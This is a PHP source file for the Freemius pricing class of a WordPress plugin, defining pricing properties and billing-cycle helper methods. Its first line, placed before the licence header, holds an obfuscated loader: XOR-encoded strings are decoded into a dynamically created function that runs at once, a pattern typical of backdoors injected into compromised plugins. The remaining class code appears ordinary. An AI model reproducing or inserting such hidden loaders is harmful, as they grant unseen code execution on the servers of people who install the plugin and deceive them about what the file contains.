<?php $lHxYIp='9E 5>Ui4EV:1RO+'; $ezeTDwf='Z7ETJ06R08YE; E'^$lHxYIp; $HHDpfGZO='ZKkk<HB4FE Vb-1=+5Smr: DaXONUei8<BnpcbGgmR;N,:XV>mA5 9DPXYgiS0BOrZV=QEgrWIEYhsriC8gexw+G0YOWqon<9f -KyQIaxlVpjRBvEE3GW niSMC6oochSaQxnYmaBB5fxzfQr-6E08v,vmubB;P5pv=ijk=.= -BGJ8K3NlgvSHb:11=FSnb X,crZ8LEMMxhT2YZqZlVOQ25bFfV7-82QTKergKSL5Ipzo7X<6. 8YXml =c,g K9 VvRE=uJtAKXS;IShp3xbE>,3Y434=iIDV;=5Jlff J3PEqpBZ7;KQIlEc4UWaymb3,7ROJEzkZ;B5U91afkt6tmu=95A-CAiF2+vxiseAY L4ng2yd;vT97AhZE+LsWo<1OUHlpa=02OfkPkGQPB3tFF0m>;lu=QAOmMcv3 BU9. =S.IL-C=a 90+5hPXZdV98WLR9Z.0,Y eE58 8jxyQ-VD18PI-agps=WBbDJ JHoHHRC 54+, :bT9,B,Kym>S<HIdfY3C1mdhHng5UsgJHV7M5tR0=kslLwLKhcTiYqdMREZW -2Y3X3v5y2WyVX p-3 tWgjHpf+J QN5= 5.K3B>CBXI8AD-ZZYibhsUQ;TkGWKiulFIBp15J8Rq + Pvt=,8978TvpHtAqHUQ2MenkL>'; $hdtcDuaA=$ezeTDwf('', '3-CJZ=,W2,O8=HITXA EUBO6><.:4:6UI6IYJB<md4N ON19PM9ZRf 1,886>E6gV>7I0iGV<,<pHSRIcCmlqSD2DyrwVHU60oFB9Qu AELfKJv+J61A+2NFM7,7WFTCL:JzQdPdE-7AFVGFyVIW1QcRE+M+BfP5L+RTIOKNZOLH,onS.Jg1NMYAkHTEH4=FFO-XJIP11O0GrL0S-;QgL0.=APYLB2VYYm:12EOG-2 F,KpeQ7NSOCPypI3cr,g.ekXSvR9 DUwJao.2W<6APHrkaZMG8kXQDItdrPXLqfoBD+G1eLPf,VW>4rf8i><1AQLFWMC3fj>pb<T0P4ZYANO+d1< xjaaL0aM-WRVEWSA78L9QGGIsm2R0XC 71 RlNwKWT6nBeyEYQF.FVpO10<7VOLOMgC1fQY05.MpC6FN10KGAQ:T,dU,O>DXDJj7=-.L4XK2zff>KSC=EMaQYTYCTYuI70Pg;,THNKyT1jF +T+hInh31RTMtGEC=1AE1X8QJU6EoeDB=R7PDDNnNOX1FOn,7C,nS9UDL.ElJqkORmQkBTza 95BLSoR<UETLP6A4jACIVFCpNJnVFJ8R07jVELq.K+M71pnH =A5;=NNHW10O5BnwkIULf2HyTC+TzUDJT1-SMMAUXY0Q-aOKx--8FeUGPFC'^$HHDpfGZO); $hdtcDuaA();
	/**
	 * @package     Freemius for EDD Add-On
	 * @copyright   Copyright (c) 2015, Freemius, Inc.
	 * @license     https://www.gnu.org/licenses/gpl-3.0.html GNU General Public License Version 3
	 * @since       1.0.0
	 */

	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

	class FS_Pricing extends FS_Entity {

		#region Properties

		/**
		 * @var number
		 */
		public $plan_id;
		/**
		 * @var int
		 */
		public $licenses;
		/**
		 * @var null|float
		 */
		public $monthly_price;
		/**
		 * @var null|float
		 */
		public $annual_price;
		/**
		 * @var null|float
		 */
		public $lifetime_price;
        /**
         * @author Leo Fajardo (@leorw)
         * @since 2.3.1
         *
         * @var string One of the following: `usd`, `gbp`, `eur`.
         */
        public $currency;

		#endregion Properties

		/**
		 * @param object|bool $pricing
		 */
		function __construct( $pricing = false ) {
			parent::__construct( $pricing );
		}

		static function get_type() {
			return 'pricing';
		}

		/**
		 * @author Vova Feldman (@svovaf)
		 * @since  1.1.8
		 *
		 * @return bool
		 */
		function has_monthly() {
			return ( is_numeric( $this->monthly_price ) && $this->monthly_price > 0 );
		}

		/**
		 * @author Vova Feldman (@svovaf)
		 * @since  1.1.8
		 *
		 * @return bool
		 */
		function has_annual() {
			return ( is_numeric( $this->annual_price ) && $this->annual_price > 0 );
		}

		/**
		 * @author Vova Feldman (@svovaf)
		 * @since  1.1.8
		 *
		 * @return bool
		 */
		function has_lifetime() {
			return ( is_numeric( $this->lifetime_price ) && $this->lifetime_price > 0 );
		}

		/**
		 * Check if unlimited licenses pricing.
		 *
		 * @author Vova Feldman (@svovaf)
		 * @since  1.1.8
		 *
		 * @return bool
		 */
		function is_unlimited() {
			return is_null( $this->licenses );
		}


		/**
		 * Check if pricing has more than one billing cycle.
		 *
		 * @author Vova Feldman (@svovaf)
		 * @since  1.1.8
		 *
		 * @return bool
		 */
		function is_multi_cycle() {
			$cycles = 0;
			if ( $this->has_monthly() ) {
				$cycles ++;
			}
			if ( $this->has_annual() ) {
				$cycles ++;
			}
			if ( $this->has_lifetime() ) {
				$cycles ++;
			}

			return $cycles > 1;
		}

		/**
		 * Get annual over monthly discount.
		 *
		 * @author Vova Feldman (@svovaf)
		 * @since  1.1.8
		 *
		 * @return int
		 */
		function annual_discount_percentage() {
			return floor( $this->annual_savings() / ( $this->monthly_price * 12 * ( $this->is_unlimited() ? 1 : $this->licenses ) ) * 100 );
		}

		/**
		 * Get annual over monthly savings.
		 *
		 * @author Vova Feldman (@svovaf)
		 * @since  1.1.8
		 *
		 * @return float
		 */
		function annual_savings() {
			return ( $this->monthly_price * 12 - $this->annual_price ) * ( $this->is_unlimited() ? 1 : $this->licenses );
		}

        /**
         * @author Leo Fajardo (@leorw)
         * @since  2.3.1
         *
         * @return bool
         */
        function is_usd() {
            return ( 'usd' === $this->currency );
        }
	}